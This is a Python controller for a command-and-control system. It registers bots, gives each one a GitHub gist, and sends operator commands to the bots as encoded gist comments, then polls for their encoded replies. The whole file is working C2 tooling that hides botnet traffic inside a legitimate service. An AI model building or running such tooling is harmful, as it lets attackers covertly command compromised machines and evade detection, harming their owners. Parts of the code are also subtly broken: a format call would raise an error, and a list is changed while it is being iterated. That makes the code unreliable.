import json
import threading
import time

import requests
from flask import Flask, request

from constants import CHECKING_BOT_ALIVE_PERIOD_SECONDS, CONTROLLER_CMD_INFO, CONTROLLER_REQ_CREATE_MSG, \
    CONTROLLER_MESSAGES, SUPPORTED_COMMANDS, COMMANDS_WITH_ARGUMENT, CONTROLLER_INPUT_EMPTY_ERR, \
    CONTROLLER_MISSING_COMMAND_ERR, CONTROLLER_UNSUPPORTED_COMMAND_ERR, CONTROLLER_MISSING_COMMAND_ARG_ERR, \
    CONTROLLER_UNKNOWN_BOT_ERR, CHECKING_COMMENT_PERIOD_SECONDS, CONTROLLER_COMMAND_TIMEOUT, CONTROLLER_NEW_BOT_MSG, \
    CONTROLLER_BOT_DISCONNECT_MSG, CONTROLLER_CHECK_BOTS_MSG
from utils import delete_gist, create_gist, get_encoded_message, add_gist_comment, get_new_gist_comment, \
    get_decoded_message

BOTS = []
BOT_URL_DICT = {}

app = Flask(__name__)


@app.route("/register-bot", methods=["POST"])
def register_bot():
    event_data = request.get_json()
    gist_id = create_gist()

    BOTS.append(gist_id)
    BOT_URL_DICT[gist_id] = event_data.get("url")
    print(CONTROLLER_NEW_BOT_MSG)

    return app.response_class(
        response=json.dumps({"gist_id": gist_id}),
        status=201,
        mimetype='application/json'
    )


@app.route("/unregister-bot", methods=["DELETE"])
def unregister_bot():
    event_data = request.get_json()
    gist_id = event_data.get("gist_id")
    delete_gist(gist_id)

    BOTS.remove(gist_id)
    print(CONTROLLER_BOT_DISCONNECT_MSG.format(id=gist_id))

    return app.response_class(
        response="Gist has been deleted",
        status=200,
        mimetype='text/plain'
    )


def check_bot():
    while True:
        for bot in BOTS:
            url = BOT_URL_DICT[bot]
            response = requests.get(url + "/alive")

            if response.status_code != 200:
                print("Bot with ID {id} is dead".format(bot))
                BOTS.remove(bot)

        time.sleep(CHECKING_BOT_ALIVE_PERIOD_SECONDS)


def read_cli_input():
    print(CONTROLLER_CMD_INFO)

    request_id = 1
    while True:
        input_data = input()

        if is_request_valid(input_data):
            print(CONTROLLER_REQ_CREATE_MSG.format(id=request_id, request=input_data))
            print(process_request(request_id, input_data))
            request_id += 1


def is_request_valid(input_data) -> bool:
    if input_data is None or input_data == "":
        print(CONTROLLER_INPUT_EMPTY_ERR)
        return False

    if input_data == "bots":
        return True

    splitted = input_data.split()
    gist_id = splitted[0]

    if gist_id not in BOTS:
        print(CONTROLLER_UNKNOWN_BOT_ERR)
        return False

    if len(splitted) < 2:
        print(CONTROLLER_MISSING_COMMAND_ERR)
        return False

    command = splitted[1]

    if command not in SUPPORTED_COMMANDS:
        print(CONTROLLER_UNSUPPORTED_COMMAND_ERR)
        return False

    if command in COMMANDS_WITH_ARGUMENT and len(splitted) < 3:
        print(CONTROLLER_MISSING_COMMAND_ARG_ERR)
        return False

    return True


def process_request(request_id, input_data) -> str:
    if input_data == "bots":
        return "[{id}] {bots}".format(id=request_id, bots=BOTS)

    splitted = input_data.split()

    gist_id = splitted[0]
    command = splitted[1]

    if len(splitted) > 2:
        command = command + " " + splitted[2]

    message = CONTROLLER_MESSAGES[splitted[1]]
    encoded = get_encoded_message(message, command)

    add_gist_comment(gist_id, encoded)
    return "[{id}] {response}".format(id=request_id, response=get_command_output(command, gist_id))


def get_command_output(command, gist_id) -> str:
    cnt = 0
    while cnt < 5:
        new_command = get_new_gist_comment(gist_id)
        decoded_command = get_decoded_message(new_command)

        if decoded_command != command:
            return decoded_command
        else:
            time.sleep(CHECKING_COMMENT_PERIOD_SECONDS)
            cnt += 1

    return CONTROLLER_COMMAND_TIMEOUT


def run_flask_server():
    app.run(host="0.0.0.0", port=5000)


thread1 = threading.Thread(target=run_flask_server)
thread2 = threading.Thread(target=read_cli_input)
thread3 = threading.Thread(target=check_bot)

thread1.start()
thread2.start()
thread3.start()
